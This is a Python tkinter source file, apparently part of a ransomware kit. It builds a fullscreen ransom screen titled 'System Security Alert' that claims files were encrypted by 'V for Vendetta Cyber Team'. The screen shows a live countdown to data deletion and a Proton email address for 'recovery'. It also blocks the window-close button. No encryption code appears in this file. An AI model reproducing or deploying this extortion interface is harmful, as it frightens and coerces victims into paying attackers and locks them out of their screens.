import tkinter as tk
from tkinter import messagebox
import threading
import requests
from PIL import Image, ImageTk
import io
from datetime import datetime, timedelta
from function import DELETE_DEADLINE
import sys

class brogui:
    def __init__(self):
        self.root = tk.Tk()
        self.setup_interface()
    
    def load_image(self):
        try:
            image_url = "https://raw.githubusercontent.com/FINIXHAWK671/Music/refs/heads/main/IMG_20250916_151915_484.jpg"
            response = requests.get(image_url, timeout=10)
            image_data = Image.open(io.BytesIO(response.content))
            resized_image = image_data.resize((400, 400), Image.Resampling.LANCZOS)
            return ImageTk.PhotoImage(resized_image)
        except Exception:
            return None
    
    def setup_interface(self):
        self.root.title("System Security Alert")
        self.root.configure(bg='#000000')
        self.root.attributes('-fullscreen', True)
        
        image = self.load_image()
        if image:
            image_label = tk.Label(self.root, image=image, bg='#000000')
            image_label.image = image
            image_label.pack(pady=40)
        
        self.create_main_message()
        self.brodown()
        self.create_contact_info()
        self.create_warning_section()
        
        self.root.protocol("WM_DELETE_WINDOW", self.prevent_close)
    
    def create_main_message(self):
        main_text = "⚠️ CRITICAL SYSTEM ALERT ⚠️\n\n"
        main_text += "YOUR FILES HAVE BEEN ENCRYPTED BY V FOR VENDETTA CYBER TEAM (VFVCT)\n\n"
        main_text += f"DATA DELETION DEADLINE: {DELETE_DEADLINE.strftime('%Y-%m-%d %H:%M:%S')}"
        
        main_label = tk.Label(
            self.root, 
            text=main_text, 
            fg='#ff0000', 
            bg='#000000',
            font=('Arial', 20, 'bold'),
            justify='center'
        )
        main_label.pack(pady=25)
    
    def brodown(self):
        self.countdown_var = tk.StringVar()
        countdown_label = tk.Label(
            self.root,
            textvariable=self.countdown_var,
            fg='#00ff00',
            bg='#000000',
            font=('Arial', 18, 'bold')
        )
        countdown_label.pack(pady=20)
        
        countdown_thread = threading.Thread(target=self.update_countdown, daemon=True)
        countdown_thread.start()
    
    def create_contact_info(self):
        contact_text = "📧 FOR DATA RECOVERY CONTACT:\n"
        contact_text += "EMAIL: vfvct@proton.me\n\n"
        contact_text += "⚠️ DO NOT ATTEMPT SELF-DECRYPTION - PERMANENT DATA LOSS WILL OCCUR ⚠️"
        
        contact_label = tk.Label(
            self.root,
            text=contact_text,
            fg='#ffff00',
            bg='#000000',
            font=('Arial', 16),
            justify='center'
        )
        contact_label.pack(pady=25)
    
    def create_warning_section(self):
        warning_text = "🚫 CLOSING THIS WINDOW WILL NOT STOP THE PROCESS 🚫\n"
        warning_text += "🔒 ALL ENCRYPTION OPERATIONS HAVE BEEN COMPLETED IN BACKGROUND 🔒"
        
        warning_label = tk.Label(
            self.root,
            text=warning_text,
            fg='#ff00ff',
            bg='#000000',
            font=('Arial', 14, 'bold'),
            justify='center'
        )
        warning_label.pack(pady=20)
    
    def update_countdown(self):
        while True:
            now = datetime.now()
            if now >= DELETE_DEADLINE:
                self.countdown_var.set("⏰ DATA HAS BEEN PERMANENTLY DELETED ⏰")
                break
            else:
                remaining = DELETE_DEADLINE - now
                days = remaining.days
                hours, remainder = divmod(remaining.seconds, 3600)
                minutes, seconds = divmod(remainder, 60)
                self.countdown_var.set(f"⏳ TIME UNTIL DELETION: {days} DAYS {hours} HOURS {minutes} MINUTES {seconds} SECONDS")
            time.sleep(1)
    
    def prevent_close(self):
        messagebox.showwarning("WARNING", "Closing window cannot stop the process!")
    
    def show_interface(self):
        self.root.mainloop()

def display_interface():
    gui = brogui()
    gui.show_interface()